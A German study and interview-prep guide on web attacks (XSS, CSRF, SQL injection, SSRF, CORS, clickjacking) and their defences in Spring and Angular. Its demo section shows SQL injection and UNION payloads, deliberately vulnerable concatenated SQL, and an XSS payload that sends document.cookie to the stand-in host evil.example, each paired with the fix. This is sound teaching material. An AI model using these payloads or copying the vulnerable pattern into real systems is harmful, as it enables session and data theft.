Web-Angriffe: XSS, CSRF, SQL Injection, SSRF, CORS

Kern: Fast alle Web-Angriffe nutzen eine von zwei Schwächen: Der Server mischt Daten mit Code (XSS, SQL Injection) oder er vertraut dem Browser oder einer URL zu sehr (CSRF, SSRF, CORS, Clickjacking). Die Abwehr ist meist eine Standard-Funktion des Frameworks plus ein Security-Header.

1. Wo sitzen die Angriffe?

  1. XSS (Cross-Site Scripting): fremdes JavaScript läuft im Kontext der echten Seite. Beispiel: Kommentar mit <script>.
  2. CSRF (Cross-Site Request Forgery): eine fremde Seite löst im Browser des Opfers einen Request aus. Der Browser schickt das Cookie mit. Beispiel: verstecktes Formular „Geld überweisen“.
  3. Clickjacking: die echte Seite liegt unsichtbar in einem iframe. Das Opfer klickt, ohne es zu wissen.
  4. CORS-Fehlkonfiguration: der Server erlaubt fremden Origins, Antworten mit Cookies zu lesen.
  5. SQL Injection: Eingaben werden Teil der SQL-Anweisung.
  6. SSRF (Server-Side Request Forgery): der Server ruft eine vom Angreifer gewählte URL auf, z. B. interne Dienste.

2. Die Reise eines CSRF- und eines XSS-Angriffs

CSRF, Schritt für Schritt:

  1. Eingeloggt. Anna ist bei bank.ch angemeldet. Ihr Browser hat ein Session-Cookie.
  2. Fremde Seite. Anna öffnet evil.example. Die Seite enthält ein verstecktes Formular, das sich selbst abschickt.
  3. Request mit Cookie. Der Browser schickt POST bank.ch/transfer. Ohne Schutz hängt er das Cookie an. Der Server sieht einen gültigen Benutzer.
  4. Abwehr. SameSite=Lax schickt das Cookie bei Cross-Site-POST nicht mit. Zusätzlich verlangt Spring ein CSRF-Token, das evil.example nicht kennt.

XSS, Schritt für Schritt:

  1. Eingabe. Der Angreifer schreibt einen Kommentar mit <script>.
  2. Speicherung. Der Server speichert ihn roh (Stored XSS).
  3. Ausführung. Anna öffnet die Seite. Das Skript läuft mit Annas Rechten auf der echten Domain. Es liest Tokens aus localStorage oder ruft APIs auf.
  4. Abwehr. Output Encoding je Kontext (HTML, Attribut, JS, URL), Frameworks wie Angular und Thymeleaf escapen standardmässig. Eine strenge CSP blockt fremde und Inline-Skripte.

3. Beispiel: SQL Injection und Output Encoding

name = "x' OR '1'='1"
sql = f"select id, name, role from users where name = '{name}'"     # FALSCH
db.execute(sql).fetchall()
db.execute("select id, name, role from users where name = ?", (name,)).fetchall()   # RICHTIG
union = "x' UNION SELECT id, name, password_hash FROM users --"
comment = "<script>fetch('https://evil.example/?c='+document.cookie)</script>"
html.escape(comment)
$ python -I sqli_demo.py
1) concat SQL : select id, name, role from users where name = 'x' OR '1'='1'
   Ergebnis   : [(1, 'anna', 'admin'), (2, 'ben', 'user')]
2) Parameter  : []
3) UNION concat: [(1, 'anna', '$argon2id$...a'), (2, 'ben', '$argon2id$...b')]
4) XSS roh       : <script>fetch('https://evil.example/?c='+document.cookie)</script>
   HTML-escaped  : &lt;script&gt;fetch(&#x27;https://evil.example/?c=&#x27;+document.cookie)&lt;/script&gt;

Echte Ausgabe, Python 3.12 mit sqlite3.

  1. Die Eingabe schliesst das Anführungszeichen und hängt OR '1'='1' an. Die Bedingung ist immer wahr: alle Benutzer.
  2. Mit Parameter (?) ist die Eingabe nur ein Wert. Niemand heisst x' OR '1'='1: leeres Ergebnis.
  3. Mit UNION holt der Angreifer Daten aus anderen Spalten, hier die Passwort-Hashes.
  4. Nach HTML-Escaping ist <script> nur noch Text. Der Browser zeigt ihn an, statt ihn auszuführen.

In Java ist der Fix derselbe:

// FALSCH
jdbc.queryForList("select * from users where name = '" + name + "'");
// RICHTIG
jdbc.queryForList("select * from users where name = ?", name);
@Query("select u from User u where u.name = :name") List<User> byName(@Param("name") String name);

Security-Header in Spring Security 7:

http.headers(h -> h
      .contentSecurityPolicy(csp -> csp.policyDirectives(
          "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'"))
      .referrerPolicy(r -> r.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)))
    .cors(Customizer.withDefaults())          // nutzt eine CorsConfigurationSource-Bean
    .csrf(csrf -> csrf.spa());                // Cookie XSRF-TOKEN, Header X-XSRF-TOKEN

4. Details, die Interviewer fragen

  1. XSS-Arten: Stored (in der DB gespeichert), Reflected (aus der URL direkt in die Antwort), DOM-based (JavaScript schreibt Eingaben ins DOM, z. B. innerHTML).
  2. XSS-Abwehr: Output Encoding je Kontext. Angular escaped Interpolation automatisch, bypassSecurityTrustHtml schaltet das ab. Thymeleaf: th:text escaped, th:utext nicht. HTML von Benutzern nur über einen Sanitizer (z. B. OWASP Java HTML Sanitizer).
  3. CSP: Die Content-Security-Policy sagt dem Browser, woher Skripte, Styles und Frames kommen dürfen. Starke Policies nutzen Nonces oder Hashes statt 'unsafe-inline'. Erst mit Content-Security-Policy-Report-Only testen.
  4. CSRF-Abwehr: Synchronizer Token (Token in Session und Formular), SameSite-Cookies, Prüfung von Origin/Sec-Fetch-Site. Spring hat CSRF-Schutz standardmässig an für unsichere Methoden wie POST.
  5. SameSite: Strict schickt das Cookie nie cross-site. Lax nur bei Top-Level-Navigation mit GET. None immer, braucht Secure. Chromium behandelt Cookies ohne Attribut als Lax, andere Browser nicht unbedingt. Darum immer explizit setzen.
  6. Wann CSRF abschalten? Bei reinen APIs mit Bearer Token im Header. Der Browser hängt den Header nicht automatisch an. Mit Cookie-Auth (auch BFF) bleibt CSRF-Schutz Pflicht.
  7. CORS: Same-Origin Policy verbietet einer Seite, Antworten anderer Origins zu lesen. CORS lockert das gezielt. Bei nicht-einfachen Requests fragt der Browser vorher mit Preflight (OPTIONS).
  8. CORS-Fehler: Access-Control-Allow-Origin spiegelt jeden Origin und setzt Allow-Credentials: true. Dann liest jede Seite die Daten des eingeloggten Benutzers. * mit Credentials verbietet der Browser. Fix: feste Liste erlaubter Origins.
  9. CORS ist kein Schutz für den Server: CORS steuert nur, was der Browser lesen darf. curl oder ein anderer Server ignorieren es. Und CORS schützt nicht gegen CSRF.
  10. Clickjacking: Schutz mit Content-Security-Policy: frame-ancestors 'none' (modern) oder X-Frame-Options: DENY (alt). Spring setzt X-Frame-Options: DENY standardmässig.
  11. SSRF: Ziele sind Cloud-Metadaten (169.254.169.254), interne Admin-Oberflächen, localhost. Fix: Allowlist von Hosts, Schema nur https, DNS auflösen und private IPs blocken, Redirects nicht folgen, Egress-NetworkPolicy.
  12. Spring-Standard-Header: Cache-Control: no-cache, no-store …, X-Content-Type-Options: nosniff, Strict-Transport-Security (nur bei HTTPS), X-Frame-Options: DENY, X-XSS-Protection: 0. CSP ist nicht Standard.
  13. HSTS: Strict-Transport-Security zwingt den Browser für eine Zeit nur auf HTTPS. Das verhindert SSL-Stripping.
  14. X-XSS-Protection: 0: Der alte Browser-Filter ist veraltet und konnte selbst Lücken öffnen. OWASP empfiehlt, ihn mit 0 auszuschalten und auf CSP zu setzen.

5. Vergleich

  • XSS vs CSRF: XSS führt Code auf der echten Seite aus und kann alles, was der Benutzer kann. CSRF schickt nur blinde Requests und kann die Antwort nicht lesen.
  • CSRF vs CORS: CSRF ist ein Angriff. CORS ist ein Lockerungsmechanismus. CORS verhindert CSRF nicht, weil der Request trotzdem beim Server ankommt.
  • X-Frame-Options vs frame-ancestors: beide gegen Clickjacking. frame-ancestors ist flexibler (mehrere Origins) und der moderne Weg.
  • Input Validation vs Output Encoding: Validierung lehnt Unsinn früh ab. Gegen XSS hilft aber nur Encoding am Ausgabeort.
  • PreparedStatement vs Escaping: Parameter trennen Code und Daten sicher. Eigenes Escaping ist fehleranfällig.
  • SSRF vs Open Redirect: SSRF lässt den Server fremde URLs aufrufen. Ein Open Redirect schickt den Browser auf fremde Seiten, oft für Phishing oder OAuth-Code-Diebstahl.

6. In der Produktion

  1. CORS-Reflection: Ein Entwickler setzt allowedOriginPatterns("*") mit allowCredentials(true) „für lokale Tests“. Lösung: Origins pro Umgebung aus der Config, nie Wildcard mit Credentials.
  2. CSRF pauschal aus: csrf.disable() aus einem Tutorial, aber die App nutzt Session-Cookies. Lösung: anlassen oder csrf.spa() für Angular.
  3. CSP bricht die App: Inline-Skripte und eval werden blockiert. Lösung: erst Report-Only, Violations sammeln, dann Nonces.
  4. SSRF über Webhook- oder PDF-Funktion: Benutzer gibt eine URL oder HTML mit <img src>. Der Server lädt interne Ressourcen. Lösung: Allowlist, eigenes Netz ohne internen Zugang, Egress-Policy.
  5. Dynamische Sortierung per SQL: ORDER BY kann man nicht parametrisieren, also wird verkettet. Lösung: Allowlist erlaubter Spaltennamen.
  6. DOM-XSS in Angular: bypassSecurityTrustHtml für „schönes HTML“ aus Benutzer-Input. Lösung: Sanitizer, Bypass nur für vertrauenswürdige Inhalte.

7. Diagnose: Werkzeuge und Befehle

  • curl -sI https://app.example.ch: Header prüfen (CSP, HSTS, X-Frame-Options, nosniff).
  • CORS testen: curl -sI -H "Origin: https://evil.example" https://api/…. Kommt Access-Control-Allow-Origin: https://evil.example zurück, ist es falsch.
  • DevTools: Console zeigt CSP- und CORS-Fehler. Application → Cookies zeigt HttpOnly, Secure, SameSite.
  • OWASP ZAP: DAST-Scan gegen Staging, findet fehlende Header, reflektierte XSS, offene Redirects.
  • SonarQube / Semgrep: findet String-Verkettung in SQL und th:utext.
  • DB-Log: Syntaxfehler mit ' in Parametern sind ein Zeichen für Injection-Versuche.

8. Senior-Punkte

  1. Framework-Standards nutzen und nicht abschalten. Spring CSRF, Angular-Escaping und Spring-Header lösen die meisten Fälle. Jede Ausnahme braucht eine Begründung im Review.
  2. Defense in Depth: Encoding plus CSP gegen XSS, SameSite plus Token gegen CSRF, Allowlist plus Netzwerk-Egress gegen SSRF.
  3. CSP ist ein Projekt, kein Header. Report-Only einführen, Violations auswerten, Inline-Code entfernen, dann scharf schalten.
  4. Tokens im Browser vergrössern den XSS-Schaden. Ein BFF mit HttpOnly-Cookie begrenzt ihn. Dafür braucht es CSRF-Schutz.
  5. SSRF ist auch ein Netzwerk-Thema. Code-Allowlist allein reicht nicht. NetworkPolicies (z. B. Cilium) begrenzen, wohin ein Pod überhaupt darf.
  6. Security-Tests automatisieren: Header-Test, CORS-Test und ein DAST-Scan in der Pipeline.

10. Fallen

  • „CORS schützt unsere API.“ → Falsch. CORS steuert nur, was ein Browser lesen darf. Jeder andere Client ignoriert es.
  • „Wir nutzen JSON, also kein CSRF.“ → Falsch. Mit Cookie-Auth und lockeren Content-Type-Regeln ist CSRF möglich. Entscheidend ist, wie authentifiziert wird.
  • „Input-Validierung verhindert XSS.“ → Falsch. Gegen XSS hilft Output Encoding im richtigen Kontext.
  • „HttpOnly verhindert XSS.“ → Falsch. Es verhindert nur das Auslesen des Cookies. Das Skript kann trotzdem Requests im Namen des Benutzers senden.
  • „ORM heisst keine SQL Injection.“ → Falsch. Verkettetes JPQL oder native Queries sind genauso injizierbar.
  • „X-XSS-Protection: 1 schützt.“ → Falsch. Der Filter ist veraltet. Empfehlung: 0 und CSP.

11. Fragen

Was ist XSS?

Fremdes JavaScript läuft im Kontext einer echten Seite. Es kann Daten lesen und Aktionen im Namen des Benutzers ausführen.

Welche XSS-Arten gibt es?

Stored (gespeichert in der DB), Reflected (aus dem Request direkt zurück) und DOM-based (JavaScript schreibt Eingaben unsicher ins DOM).

Wie verhindern Sie XSS?

Output Encoding je Kontext, Framework-Escaping nicht umgehen, Sanitizer für Benutzer-HTML und eine strenge CSP als zweite Linie.

Was ist eine Content Security Policy?

Ein Header, der festlegt, woher Skripte, Styles, Bilder und Frames kommen dürfen. Mit Nonces blockt sie Inline-Skripte von Angreifern.

Was ist CSRF?

Eine fremde Seite löst im Browser des Opfers einen Request an eine andere Seite aus. Der Browser schickt das Cookie mit, der Server hält es für echt.

Wie schützt Spring vor CSRF?

Standardmässig mit einem Synchronizer Token für unsichere Methoden. Für SPAs gibt es csrf.spa() mit Cookie XSRF-TOKEN und Header X-XSRF-TOKEN.

Wann darf man CSRF-Schutz abschalten?

Wenn die API nur Bearer Tokens im Header nutzt und keine Cookies zur Authentifizierung. Mit Session-Cookies nie.

Was bewirkt SameSite=Lax?

Das Cookie geht cross-site nur bei Top-Level-Navigation mit GET mit, nicht bei POST aus fremden Seiten oder in iframes. Das blockt die meisten CSRF-Angriffe.

Was ist CORS?

Ein Mechanismus, mit dem ein Server dem Browser erlaubt, Antworten für andere Origins lesbar zu machen. Er lockert die Same-Origin Policy.

Was ist ein Preflight-Request?

Ein OPTIONS-Request, mit dem der Browser vor einem nicht-einfachen Cross-Origin-Request fragt, ob Methode und Header erlaubt sind.

Was ist eine gefährliche CORS-Konfiguration?

Jeden Origin spiegeln und Allow-Credentials true setzen. Dann liest jede Webseite die Daten eingeloggter Benutzer.

Schützt CORS vor CSRF?

Nein. Der Request kommt trotzdem beim Server an, nur die Antwort ist nicht lesbar. Gegen CSRF helfen Token und SameSite.

Wie verhindern Sie SQL Injection?

Parametrisierte Queries mit PreparedStatement, Named Parameters oder Spring Data. Für Spaltennamen in ORDER BY eine Allowlist. Dazu ein DB-User mit minimalen Rechten.

Was ist SSRF?

Der Server ruft eine vom Angreifer gewählte URL auf. So erreicht der Angreifer interne Dienste oder Cloud-Metadaten. Seit 2025 Teil von OWASP A01.

Wie verhindern Sie SSRF?

Host-Allowlist, nur https, DNS auflösen und private IP-Bereiche blocken, keine Redirects folgen und Egress im Netzwerk begrenzen.

Was ist Clickjacking und wie verhindern Sie es?

Die echte Seite liegt unsichtbar in einem iframe, das Opfer klickt darauf. Schutz: CSP frame-ancestors 'none' oder X-Frame-Options DENY.

Welche Security-Header setzt Spring Security standardmässig?

Cache-Control, X-Content-Type-Options nosniff, HSTS bei HTTPS, X-Frame-Options DENY und X-XSS-Protection 0. CSP muss man selbst konfigurieren.

Was macht HSTS?

Strict-Transport-Security zwingt den Browser für eine Zeit, die Domain nur über HTTPS aufzurufen. Das verhindert SSL-Stripping.

Was ist der Unterschied zwischen XSS und CSRF?

XSS führt Code auf der echten Seite aus und kann Antworten lesen. CSRF schickt nur blinde Requests mit den Cookies des Opfers.

Warum setzt man X-XSS-Protection auf 0?

Der alte Browser-Filter ist veraltet und konnte selbst Lücken öffnen. OWASP empfiehlt 0 und eine CSP.

Szenario: Ein Pentest zeigt, dass Access-Control-Allow-Origin jeden Origin zurückgibt, mit Credentials. Was tun Sie?

Sofort feste Liste erlaubter Origins pro Umgebung konfigurieren, keine Wildcards mit Credentials. Danach einen automatischen Test mit fremdem Origin in die Pipeline.

Szenario: Eine Funktion „Bild per URL importieren“ soll gebaut werden. Worauf achten Sie?

SSRF. Nur https, Host-Allowlist oder Blockade privater IPs nach DNS-Auflösung, keine Redirects, Timeout und Grössenlimit, Download in isoliertem Netz mit Egress-Policy.

Szenario: Nach Einführen einer CSP funktioniert das Frontend nicht mehr. Wie gehen Sie vor?

Policy zuerst als Report-Only ausrollen und Violations sammeln. Inline-Skripte entfernen oder mit Nonces versehen, Drittquellen gezielt erlauben, dann scharf schalten.
